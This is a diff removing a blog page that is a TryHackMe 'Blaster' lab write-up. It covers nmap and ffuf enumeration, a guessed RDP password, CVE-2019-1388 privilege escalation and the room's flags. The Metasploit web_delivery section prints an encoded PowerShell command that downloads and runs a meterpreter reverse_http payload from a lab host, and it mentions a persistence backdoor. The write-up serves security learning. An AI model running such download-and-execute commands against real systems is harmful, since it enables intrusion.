@@ -1,326 +1,0 @@
-<!DOCTYPE html>
-<html lang="en">
-    <head>
-        <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="ie=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="author" content="nair0lf32 ">
-<meta name="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 10.0|_http-title: IIS Windows Server| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.03389/tcp open ssl/ms-wbt-server? syn-ack| rdp-ntlm-info: | Target_Name: RETROWEB| NetBIOS_Domain_Name: RETROWEB| NetBIOS_Computer_Name: RETROWEB| DNS_Domain_Name: RetroWeb| DNS_Computer_Name: RetroWeb| Product_Version: 10.0.14393|_ System_Time: 2021-11-25T11:34:32&#43;00:00|_ssl-date: 2021-11-25T11:34:40&#43;00:00; &#43;2m29s from scanner time.| ssl-cert: Subject: commonName=RetroWeb| Issuer: commonName=RetroWeb| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2021-11-24T11:29:28| Not valid after: 2022-05-26T11:29:28| MD5: 0151 0047 a3fc c5ce 222d 5b1c 06c4 22ca| SHA-1: bbe0 b822 09c4 19d6 f833 d955 ea5c 77b2 06a1 7655| -----BEGIN CERTIFICATE-----| MIIC1DCCAbygAwIBAgIQT11vH87CQaZJ1GVx/&#43;HWPTANBgkqhkiG9w0BAQsFADAT| MREwDwYDVQQDEwhSZXRyb1dlYjAeFw0yMTExMjQxMTI5MjhaFw0yMjA1MjYxMTI5| MjhaMBMxETAPBgNVBAMTCFJldHJvV2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A| MIIBCgKCAQEAs5imJsXtygtq3EAJStpMJMHJKHYninyGcaoS8QGtzrcPCnL8o2Eh| ukCUsIBQKbFymcXT&#43;TEeLU&#43;q9&#43;R8xrmX&#43;8fVwckX3XA2seKOa4CQkYolEBtZ3kq5| bbR1Jzirf3KpwoO5el/TYlxFDvGJMKsDUZYftAfhkaTCS0L2tLbARHCHHmX9SKxH| D0G7CiBW708w3gAnqkSLLfD&#43;n1DXig6vP1hOQz3k/&#43;zWl9iHoKkl/TLl3umD1J0q| C5ympfGavD4dFwANWVf0ISmOZj4W3eYCWnaul6l3GQlKJN8cpIB0PRxwvpyfabn6| JBPuWtosjHAD9U9DTQ/HqzzkRCtWUIGlBwIDAQABoyQwIjATBgNVHSUEDDAKBggr| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAHY6p9ZxWpMU| Stj2A8gJpTchEWzSYaHhP62BNOxLrNUSN/NKbHVewgF5QmxWDLr6wb&#43;DtT7Q9JmR| AhG72MzKkYf4BMuUbu37xkpxhlXDaQCYDpf8GzoTp9KnHy2w1CwYwaZ93lqzJqkt| B6i6IqNbolEZYi52gksnCAymGOtjXWtwwPK3HTYYXGWH5ImmUkoNEKJxQuVQdeMI| zWtXKhSkNwcfE7ct8ZmpPF9HX0ELRfAFNP2WQPl9R&#43;CZHQWrH9R1Z7B5sb4gEBKL| KGBsZwID6qVW1cXW5Mq9jjHwK8UcBzI&#43;7Wq72IzUf0Rge&#43;Vwxo/lqJeog&#43;mlgR4P| vhHE6Qv&#43;uW8=|_-----END CERTIFICATE-----Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2m29s, deviation: 0s, median: 2m28s ffuf (using big." />
-<meta name="keywords" content="" />
-<meta name="robots" content="noodp" />
-<meta name="theme-color" content="" />
-<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/blaster/blaster/" />
-
-
-    <title>
-        
-            Blaster :: Zer0ne  — welcome friend
-        
-    </title>
-
-
-
-<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
-    type="text/css">
-
-
-
-<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
-
-
-
-    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
-    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
-    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
-    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
-    <meta name="msapplication-TileColor" content="">
-
-
-<meta itemprop="name" content="Blaster">
-<meta itemprop="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 10.0|_http-title: IIS Windows Server| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.03389/tcp open ssl/ms-wbt-server? syn-ack| rdp-ntlm-info: | Target_Name: RETROWEB| NetBIOS_Domain_Name: RETROWEB| NetBIOS_Computer_Name: RETROWEB| DNS_Domain_Name: RetroWeb| DNS_Computer_Name: RetroWeb| Product_Version: 10.0.14393|_ System_Time: 2021-11-25T11:34:32&#43;00:00|_ssl-date: 2021-11-25T11:34:40&#43;00:00; &#43;2m29s from scanner time.| ssl-cert: Subject: commonName=RetroWeb| Issuer: commonName=RetroWeb| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2021-11-24T11:29:28| Not valid after: 2022-05-26T11:29:28| MD5: 0151 0047 a3fc c5ce 222d 5b1c 06c4 22ca| SHA-1: bbe0 b822 09c4 19d6 f833 d955 ea5c 77b2 06a1 7655| -----BEGIN CERTIFICATE-----| MIIC1DCCAbygAwIBAgIQT11vH87CQaZJ1GVx/&#43;HWPTANBgkqhkiG9w0BAQsFADAT| MREwDwYDVQQDEwhSZXRyb1dlYjAeFw0yMTExMjQxMTI5MjhaFw0yMjA1MjYxMTI5| MjhaMBMxETAPBgNVBAMTCFJldHJvV2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A| MIIBCgKCAQEAs5imJsXtygtq3EAJStpMJMHJKHYninyGcaoS8QGtzrcPCnL8o2Eh| ukCUsIBQKbFymcXT&#43;TEeLU&#43;q9&#43;R8xrmX&#43;8fVwckX3XA2seKOa4CQkYolEBtZ3kq5| bbR1Jzirf3KpwoO5el/TYlxFDvGJMKsDUZYftAfhkaTCS0L2tLbARHCHHmX9SKxH| D0G7CiBW708w3gAnqkSLLfD&#43;n1DXig6vP1hOQz3k/&#43;zWl9iHoKkl/TLl3umD1J0q| C5ympfGavD4dFwANWVf0ISmOZj4W3eYCWnaul6l3GQlKJN8cpIB0PRxwvpyfabn6| JBPuWtosjHAD9U9DTQ/HqzzkRCtWUIGlBwIDAQABoyQwIjATBgNVHSUEDDAKBggr| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAHY6p9ZxWpMU| Stj2A8gJpTchEWzSYaHhP62BNOxLrNUSN/NKbHVewgF5QmxWDLr6wb&#43;DtT7Q9JmR| AhG72MzKkYf4BMuUbu37xkpxhlXDaQCYDpf8GzoTp9KnHy2w1CwYwaZ93lqzJqkt| B6i6IqNbolEZYi52gksnCAymGOtjXWtwwPK3HTYYXGWH5ImmUkoNEKJxQuVQdeMI| zWtXKhSkNwcfE7ct8ZmpPF9HX0ELRfAFNP2WQPl9R&#43;CZHQWrH9R1Z7B5sb4gEBKL| KGBsZwID6qVW1cXW5Mq9jjHwK8UcBzI&#43;7Wq72IzUf0Rge&#43;Vwxo/lqJeog&#43;mlgR4P| vhHE6Qv&#43;uW8=|_-----END CERTIFICATE-----Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2m29s, deviation: 0s, median: 2m28s ffuf (using big."><meta itemprop="datePublished" content="2022-09-20T16:00:31+01:00" />
-<meta itemprop="dateModified" content="2022-09-20T16:00:31+01:00" />
-<meta itemprop="wordCount" content="707"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
-<meta itemprop="keywords" content="" />
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
-
-<meta name="twitter:title" content="Blaster"/>
-<meta name="twitter:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 10.0|_http-title: IIS Windows Server| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.03389/tcp open ssl/ms-wbt-server? syn-ack| rdp-ntlm-info: | Target_Name: RETROWEB| NetBIOS_Domain_Name: RETROWEB| NetBIOS_Computer_Name: RETROWEB| DNS_Domain_Name: RetroWeb| DNS_Computer_Name: RetroWeb| Product_Version: 10.0.14393|_ System_Time: 2021-11-25T11:34:32&#43;00:00|_ssl-date: 2021-11-25T11:34:40&#43;00:00; &#43;2m29s from scanner time.| ssl-cert: Subject: commonName=RetroWeb| Issuer: commonName=RetroWeb| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2021-11-24T11:29:28| Not valid after: 2022-05-26T11:29:28| MD5: 0151 0047 a3fc c5ce 222d 5b1c 06c4 22ca| SHA-1: bbe0 b822 09c4 19d6 f833 d955 ea5c 77b2 06a1 7655| -----BEGIN CERTIFICATE-----| MIIC1DCCAbygAwIBAgIQT11vH87CQaZJ1GVx/&#43;HWPTANBgkqhkiG9w0BAQsFADAT| MREwDwYDVQQDEwhSZXRyb1dlYjAeFw0yMTExMjQxMTI5MjhaFw0yMjA1MjYxMTI5| MjhaMBMxETAPBgNVBAMTCFJldHJvV2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A| MIIBCgKCAQEAs5imJsXtygtq3EAJStpMJMHJKHYninyGcaoS8QGtzrcPCnL8o2Eh| ukCUsIBQKbFymcXT&#43;TEeLU&#43;q9&#43;R8xrmX&#43;8fVwckX3XA2seKOa4CQkYolEBtZ3kq5| bbR1Jzirf3KpwoO5el/TYlxFDvGJMKsDUZYftAfhkaTCS0L2tLbARHCHHmX9SKxH| D0G7CiBW708w3gAnqkSLLfD&#43;n1DXig6vP1hOQz3k/&#43;zWl9iHoKkl/TLl3umD1J0q| C5ympfGavD4dFwANWVf0ISmOZj4W3eYCWnaul6l3GQlKJN8cpIB0PRxwvpyfabn6| JBPuWtosjHAD9U9DTQ/HqzzkRCtWUIGlBwIDAQABoyQwIjATBgNVHSUEDDAKBggr| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAHY6p9ZxWpMU| Stj2A8gJpTchEWzSYaHhP62BNOxLrNUSN/NKbHVewgF5QmxWDLr6wb&#43;DtT7Q9JmR| AhG72MzKkYf4BMuUbu37xkpxhlXDaQCYDpf8GzoTp9KnHy2w1CwYwaZ93lqzJqkt| B6i6IqNbolEZYi52gksnCAymGOtjXWtwwPK3HTYYXGWH5ImmUkoNEKJxQuVQdeMI| zWtXKhSkNwcfE7ct8ZmpPF9HX0ELRfAFNP2WQPl9R&#43;CZHQWrH9R1Z7B5sb4gEBKL| KGBsZwID6qVW1cXW5Mq9jjHwK8UcBzI&#43;7Wq72IzUf0Rge&#43;Vwxo/lqJeog&#43;mlgR4P| vhHE6Qv&#43;uW8=|_-----END CERTIFICATE-----Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2m29s, deviation: 0s, median: 2m28s ffuf (using big."/>
-
-
-
-    <meta property="og:title" content="Blaster" />
-<meta property="og:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack Microsoft IIS httpd 10.0|_http-title: IIS Windows Server| http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.03389/tcp open ssl/ms-wbt-server? syn-ack| rdp-ntlm-info: | Target_Name: RETROWEB| NetBIOS_Domain_Name: RETROWEB| NetBIOS_Computer_Name: RETROWEB| DNS_Domain_Name: RetroWeb| DNS_Computer_Name: RetroWeb| Product_Version: 10.0.14393|_ System_Time: 2021-11-25T11:34:32&#43;00:00|_ssl-date: 2021-11-25T11:34:40&#43;00:00; &#43;2m29s from scanner time.| ssl-cert: Subject: commonName=RetroWeb| Issuer: commonName=RetroWeb| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2021-11-24T11:29:28| Not valid after: 2022-05-26T11:29:28| MD5: 0151 0047 a3fc c5ce 222d 5b1c 06c4 22ca| SHA-1: bbe0 b822 09c4 19d6 f833 d955 ea5c 77b2 06a1 7655| -----BEGIN CERTIFICATE-----| MIIC1DCCAbygAwIBAgIQT11vH87CQaZJ1GVx/&#43;HWPTANBgkqhkiG9w0BAQsFADAT| MREwDwYDVQQDEwhSZXRyb1dlYjAeFw0yMTExMjQxMTI5MjhaFw0yMjA1MjYxMTI5| MjhaMBMxETAPBgNVBAMTCFJldHJvV2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A| MIIBCgKCAQEAs5imJsXtygtq3EAJStpMJMHJKHYninyGcaoS8QGtzrcPCnL8o2Eh| ukCUsIBQKbFymcXT&#43;TEeLU&#43;q9&#43;R8xrmX&#43;8fVwckX3XA2seKOa4CQkYolEBtZ3kq5| bbR1Jzirf3KpwoO5el/TYlxFDvGJMKsDUZYftAfhkaTCS0L2tLbARHCHHmX9SKxH| D0G7CiBW708w3gAnqkSLLfD&#43;n1DXig6vP1hOQz3k/&#43;zWl9iHoKkl/TLl3umD1J0q| C5ympfGavD4dFwANWVf0ISmOZj4W3eYCWnaul6l3GQlKJN8cpIB0PRxwvpyfabn6| JBPuWtosjHAD9U9DTQ/HqzzkRCtWUIGlBwIDAQABoyQwIjATBgNVHSUEDDAKBggr| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAHY6p9ZxWpMU| Stj2A8gJpTchEWzSYaHhP62BNOxLrNUSN/NKbHVewgF5QmxWDLr6wb&#43;DtT7Q9JmR| AhG72MzKkYf4BMuUbu37xkpxhlXDaQCYDpf8GzoTp9KnHy2w1CwYwaZ93lqzJqkt| B6i6IqNbolEZYi52gksnCAymGOtjXWtwwPK3HTYYXGWH5ImmUkoNEKJxQuVQdeMI| zWtXKhSkNwcfE7ct8ZmpPF9HX0ELRfAFNP2WQPl9R&#43;CZHQWrH9R1Z7B5sb4gEBKL| KGBsZwID6qVW1cXW5Mq9jjHwK8UcBzI&#43;7Wq72IzUf0Rge&#43;Vwxo/lqJeog&#43;mlgR4P| vhHE6Qv&#43;uW8=|_-----END CERTIFICATE-----Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2m29s, deviation: 0s, median: 2m28s ffuf (using big." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/blaster/blaster/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
-<meta property="article:published_time" content="2022-09-20T16:00:31+01:00" />
-<meta property="article:modified_time" content="2022-09-20T16:00:31+01:00" /><meta property="og:site_name" content="Zer0ne" />
-
-
-
-
-
-    <meta property="article:section" content="TryHackMe" />
-
-
-
-    <meta property="article:published_time" content="2022-09-20 16:00:31 &#43;0100 WAT" />
-
-
-
-
-
-
-
-
-
-
-    </head>
-
-    
-        <body>
-    
-    
-        <div class="container">
-            <header class="header">
-    <span class="header__inner">
-        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
-    <div class="logo">
-        
-            <span class="logo__mark">&gt;</span>
-            <span class="logo__text">Zer0ne #</span>
-            <span class="logo__cursor" style=
-                  "
-                   background-color:#0FF00D;
-                   animation-duration:2s;">
-            </span>
-        
-    </div>
-</a>
-
-
-        <span class="header__right">
-            
-                <nav class="menu">
-    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
-    </ul>
-</nav>
-
-                <span class="menu-trigger">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                        <path d="M0 0h24v24H0z" fill="none"/>
-                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
-                    </svg>
-                </span>
-            
-                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
-   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
-   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
- </svg></span>
-        </span>
-    </span>
-</header>
-
-
-            <div class="content">
-                
-    <main class="post">
-
-        <div class="post-info">
-            
-            </p>
-        </div>
-
-        <article>
-            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/blaster/blaster/">Blaster</a></h2>
-
-            
-            
-            
-
-            <div class="post-content">
-                
-    <img src="https://nair0lf32.github.io/zer0ne/thm/blaster/blaster.jpeg"  alt="blaster"  class="left"  style="width: 200px;"  />
-
-
-<h2 id="enumeration">Enumeration</h2>
-<h3 id="nmap">nmap</h3>
-<pre tabindex="0"><code>PORT     STATE SERVICE            REASON  VERSION
-80/tcp   open  http               syn-ack Microsoft IIS httpd 10.0
-|_http-title: IIS Windows Server
-| http-methods: 
-|   Supported Methods: OPTIONS TRACE GET HEAD POST
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-
-3389/tcp open  ssl/ms-wbt-server? syn-ack
-| rdp-ntlm-info: 
-|   Target_Name: RETROWEB
-|   NetBIOS_Domain_Name: RETROWEB
-|   NetBIOS_Computer_Name: RETROWEB
-|   DNS_Domain_Name: RetroWeb
-|   DNS_Computer_Name: RetroWeb
-|   Product_Version: 10.0.14393
-|_  System_Time: 2021-11-25T11:34:32+00:00
-|_ssl-date: 2021-11-25T11:34:40+00:00; +2m29s from scanner time.
-| ssl-cert: Subject: commonName=RetroWeb
-| Issuer: commonName=RetroWeb
-| Public Key type: rsa
-| Public Key bits: 2048
-| Signature Algorithm: sha256WithRSAEncryption
-| Not valid before: 2021-11-24T11:29:28
-| Not valid after:  2022-05-26T11:29:28
-| MD5:   0151 0047 a3fc c5ce 222d 5b1c 06c4 22ca
-| SHA-1: bbe0 b822 09c4 19d6 f833 d955 ea5c 77b2 06a1 7655
-| -----BEGIN CERTIFICATE-----
-| MIIC1DCCAbygAwIBAgIQT11vH87CQaZJ1GVx/+HWPTANBgkqhkiG9w0BAQsFADAT
-| MREwDwYDVQQDEwhSZXRyb1dlYjAeFw0yMTExMjQxMTI5MjhaFw0yMjA1MjYxMTI5
-| MjhaMBMxETAPBgNVBAMTCFJldHJvV2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
-| MIIBCgKCAQEAs5imJsXtygtq3EAJStpMJMHJKHYninyGcaoS8QGtzrcPCnL8o2Eh
-| ukCUsIBQKbFymcXT+TEeLU+q9+R8xrmX+8fVwckX3XA2seKOa4CQkYolEBtZ3kq5
-| bbR1Jzirf3KpwoO5el/TYlxFDvGJMKsDUZYftAfhkaTCS0L2tLbARHCHHmX9SKxH
-| D0G7CiBW708w3gAnqkSLLfD+n1DXig6vP1hOQz3k/+zWl9iHoKkl/TLl3umD1J0q
-| C5ympfGavD4dFwANWVf0ISmOZj4W3eYCWnaul6l3GQlKJN8cpIB0PRxwvpyfabn6
-| JBPuWtosjHAD9U9DTQ/HqzzkRCtWUIGlBwIDAQABoyQwIjATBgNVHSUEDDAKBggr
-| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAHY6p9ZxWpMU
-| Stj2A8gJpTchEWzSYaHhP62BNOxLrNUSN/NKbHVewgF5QmxWDLr6wb+DtT7Q9JmR
-| AhG72MzKkYf4BMuUbu37xkpxhlXDaQCYDpf8GzoTp9KnHy2w1CwYwaZ93lqzJqkt
-| B6i6IqNbolEZYi52gksnCAymGOtjXWtwwPK3HTYYXGWH5ImmUkoNEKJxQuVQdeMI
-| zWtXKhSkNwcfE7ct8ZmpPF9HX0ELRfAFNP2WQPl9R+CZHQWrH9R1Z7B5sb4gEBKL
-| KGBsZwID6qVW1cXW5Mq9jjHwK8UcBzI+7Wq72IzUf0Rge+Vwxo/lqJeog+mlgR4P
-| vhHE6Qv+uW8=
-|_-----END CERTIFICATE-----
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: mean: 2m29s, deviation: 0s, median: 2m28s
-</code></pre><h3 id="ffuf-using-bigtxt">ffuf (using big.txt)</h3>
-<pre tabindex="0"><code>retro                   [Status: 301, Size: 150, Words: 9, Lines: 2]
-</code></pre><p>As a big fan of videogames and a retro games enjoyer this page was just amazing</p>
-<p>the user <code>wade</code> seem to be a very cool guy</p>
-<pre tabindex="0"><code>I can’t believe the movie based on my favorite book of all time is going to come out in a few days! Maybe it’s because my name is so similar to the main character, but I honestly feel a deep connection to the main character Wade. I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down. Either way, I’m really excited to see this movie! 
-</code></pre><p>google &ldquo;wade book character&rdquo; if you don&rsquo;t know about <code>Ready player one</code></p>
-<p>yeah they actually made a movie of that</p>
-<p>anyway we are looking for Wade Owen Watts avatar (OaSiS) name as password</p>
-<p>its <code>parzival</code></p>
-<h2 id="exploitation">Exploitation</h2>
-<p>We RDP with those and read user.txt</p>
-<p>THM{ready_player_one}</p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<p>ugh&hellip;internet explorer</p>
-<p>For this part I tried many times to check the browser&rsquo;s history but could only see today&rsquo;s history wich was not useful</p>
-<p>I went to ask for help and got</p>
-<p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1388">cve-2019-1388</a></p>
-<p>And according to the summary</p>
-<pre tabindex="0"><code>To exploit this vulnerability, an attacker would first have to log on to the system. An attacker could then run a specially crafted application that could exploit the vulnerability and take control of an affected system.
-</code></pre><p>When trying to run <code>hhupd.exe</code> we get admin password prompt</p>
-<p>click on <code>show more details</code> then <code>show information about the publisher's certificate</code></p>
-<p>click the <code>versign</code> link after &lsquo;Issued by:&rsquo;</p>
-<p>Again I had issues making this part work&hellip;</p>
-<p>Got a 404 error on the link where it was supposed to serve a page</p>
-<p>We normally save it as <code>C:\Windows\System32\*.*</code> (filename)</p>
-<p>And run cmd as <code>nt authority\system</code>&hellip;</p>
-<p>I could not do this so I went directly to the metasploit method</p>
-<p>hoping this would work&hellip;</p>
-<p>We use <code>exploit/multi/script/web_delivery</code></p>
-<pre tabindex="0"><code>msf6 exploit(multi/script/web_delivery) &gt; show targets
-
-Exploit targets:
-
-   Id  Name
-   --  ----
-   0   Python
-   1   PHP
-   2   PSH
-   3   Regsvr32
-   4   pubprn
-   5   SyncAppvPublishingServer
-   6   PSH (Binary)
-   7   Linux
-   8   Mac OS X
-
-
-msf6 exploit(multi/script/web_delivery) &gt; set target 2
-target =&gt; 2
-</code></pre><p>we set the payload to <code>windows/meterpreter/reverse_http</code></p>
-<p>then we run as a job with <code>run -j</code></p>
-<p>we get this</p>
-<pre tabindex="0"><code>[*] Run the following command on the target machine:
-powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABpAGwAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAaQBsAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAaQBsAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADIAMgA2AC4AMgAwADMAOgA4ADAAOAAwAC8AMwA2AHUAMwBuAEEASgBmAG8ASQBRADYATwB1AEkALwBrADcAQQA0AGYAVwBmAHEAOQBxAGgAMwBQAFMATAAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADIAMgA2AC4AMgAwADMAOgA4ADAAOAAwAC8AMwA2AHUAMwBuAEEASgBmAG8ASQBRADYATwB1AEkAJwApACkAOwA=
-</code></pre><p>I pasted it in a cmd console&hellip;it crashed :-(</p>
-<p>anyway <code>run persistence -X</code> was supposed to give us a backdoor</p>
-<p>well..according to reddit and other not-so-trustable sources there is an issue
-with this room</p>
-<p>And tryhackme seems to be aware, here is from <a href="https://help.tryhackme.com/miscellaneous/known-issues-with-rooms">known issues</a></p>
-<pre tabindex="0"><code>Blaster
-
-Issue: No web-browser history for the CVE.
-
-Current workaround: The original room for this - Retro - has the CVE as expected.
-
-Expected timeline of resolution: Indefinite.
-</code></pre><p>ah yes here is the root flag (real flag no jokes XD) if that matter to you</p>
-<p><code>THM{COIN_OPERATED_EXPLOITATION}</code></p>
-<p>As long as issues are not fixed you might as well have this one for free</p>
-<p>Anyway this was a fun trial&hellip;hope this is fixed soon</p>
-<p>I strongly recommand trying <code>retro</code> room later as its similar to this one but HARDER</p>
-<p>I will do it when I am ready&hellip;(kek)</p>
-
-            </div>
-        </article>
-
-        <hr />
-
-        <div class="post-info">
-            
-            
-    <p>
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
-
-        <span class="tag"><a href="https://nair0lf32.github.io/zer0ne/categories/tryhackme/">TryHackMe</a></span>
-        
-    </p>
-
-  		</div>
-    </main>
-
-            </div>
-
-            
-                <footer class="footer">
-    
-    <div class="footer__inner">
-        <div class="footer__content">
-            <span>&copy; 2022</span>
-            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
-            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
-            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
-            
-        </div>
-    </div>
-    
-    
-    <div class="footer__inner">
-        <div class="footer__content">
-            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
-        </div>
-    </div>
-    
-</footer>
-
-            
-        </div>
-
-        
-
-
-
-<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
-
-
-
-    </body>
-</html>
